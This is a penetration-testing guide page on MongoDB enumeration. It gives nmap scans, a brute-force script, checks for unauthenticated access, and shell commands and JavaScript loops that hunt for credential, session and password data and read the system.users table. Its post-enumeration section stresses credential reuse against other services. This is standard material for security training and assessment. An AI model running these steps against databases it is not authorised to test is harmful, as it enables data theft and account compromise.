% Filename: 02-reconnaissance/enum-database/mongodb.md
% Display name: MongoDB Enumeration
% Last update: 2026-02-09
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# MongoDB Enumeration

## Overview

MongoDB runs on TCP 27017 by default (with the HTTP interface on TCP 28017 in older versions). It is a NoSQL document database that historically shipped with no authentication enabled. Enumeration targets access testing, database/collection listing, and document extraction. Unauthenticated MongoDB instances exposed to the network are a critical finding — they provide direct read/write access to all data.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target TCP 27017
- Nmap installed
- Optional: `mongosh` (not on Kali by default — see install section below)

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 27017 <target>
```

Expected output:
```text
27017/tcp open  mongodb  MongoDB 6.0.4
```

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Server info and database listing
nmap -p 27017 --script mongodb-info <target>

# List databases
nmap -p 27017 --script mongodb-databases <target>

# Brute-force
nmap -p 27017 --script mongodb-brute <target>
```

### mongosh Connection

```bash
# Test unauthenticated access
mongosh --host <target> --quiet --eval "db.adminCommand('listDatabases')"
```

If databases are returned without credentials, authentication is not enforced.

```bash
# Interactive connection (no auth)
mongosh --host <target>

# Authenticated connection
mongosh --host <target> -u <user> -p <password> --authenticationDatabase admin
```

The legacy `mongo` shell is deprecated — `mongosh` is the current client. On Kali, it may need to be installed:

```bash
# Install mongosh (not on Kali by default)
# https://www.mongodb.com/docs/mongodb-shell/install/
# Download from MongoDB and install manually, or:
# https://github.com/mongodb-js/mongosh (source)
```

### Database Enumeration

Once connected:

```javascript
// List databases
show dbs

// Switch to a database
use <database>

// List collections
show collections
db.getCollectionNames()

// Count documents in a collection
db.<collection>.countDocuments()

// Dump all documents from a collection
db.<collection>.find()

// Formatted output
db.<collection>.find().pretty()

// Limit results
db.<collection>.find().limit(10)

// Search for specific fields
db.<collection>.find({}, {username: 1, password: 1, email: 1})

// Search with filter
db.<collection>.find({role: "admin"})
```

### Targeted Data Extraction

```javascript
// Find collections likely containing credentials
db.getCollectionNames().forEach(function(c) {
    if (c.match(/user|account|credential|auth|login|admin|session/i)) {
        print("=== " + c + " ===");
        printjson(db[c].find().limit(5).toArray());
    }
})

// Search across all collections for password fields
db.getCollectionNames().forEach(function(c) {
    var count = db[c].countDocuments({password: {$exists: true}});
    if (count > 0) print(c + ": " + count + " docs with password field");
})
```

### User Enumeration

```javascript
// List database users (requires admin access)
use admin
db.system.users.find().pretty()

// Show roles
db.getRoles({showBuiltinRoles: true})
```

### Configuration and Status

```javascript
// Server status
db.serverStatus()

// Server build info (version, modules, OpenSSL)
db.serverBuildInfo()

// Startup parameters
db.adminCommand({getCmdLineOpts: 1})

// Check if auth is enabled
db.adminCommand({getParameter: 1, authenticationMechanisms: 1})
```

### Configuration Files

| File | Location | Contains |
|------|----------|----------|
| mongod.conf | /etc/mongod.conf | Server configuration |
| mongod.conf | /etc/mongodb.conf | Alternative (older) location |

Key settings to check:
- `security.authorization` — if `disabled` or absent, no auth required
- `net.bindIp` — if `0.0.0.0`, server listens on all interfaces

## Post-Enumeration

With MongoDB access, prioritize:
- User credentials — usernames, passwords, email addresses, tokens in collections
- Admin database users in `system.users` for authentication bypass
- Session data and API keys stored as documents
- Application configuration collections with database connection strings
- Credential reuse — test extracted passwords against other services

## References

### Official Documentation

- [MongoDB Documentation](https://www.mongodb.com/docs/)
- [MongoDB Shell (mongosh)](https://github.com/mongodb-js/mongosh)
- [MongoDB Enable Access Control](https://www.mongodb.com/docs/manual/tutorial/enable-authentication/)
- [Nmap mongodb-databases NSE Script](https://nmap.org/nsedoc/scripts/mongodb-databases.html)
- [Nmap mongodb-brute NSE Script](https://nmap.org/nsedoc/scripts/mongodb-brute.html)

### Pentest Guides & Research

- [Rapid7 — Pentesting in the Real World: Going Bananas with MongoDB](https://www.rapid7.com/blog/post/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/)
- [NoSQLMap — Automated NoSQL Database Enumeration and Exploitation](https://github.com/codingo/NoSQLMap)
- [Virtue Security — Unauthenticated MongoDB: Attack and Defense](https://www.virtuesecurity.com/kb/unauthenticated-mongodb-attack-and-defense/)

### MITRE ATT&CK

- [T1595 — Active Scanning](https://attack.mitre.org/techniques/T1595/)
- [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
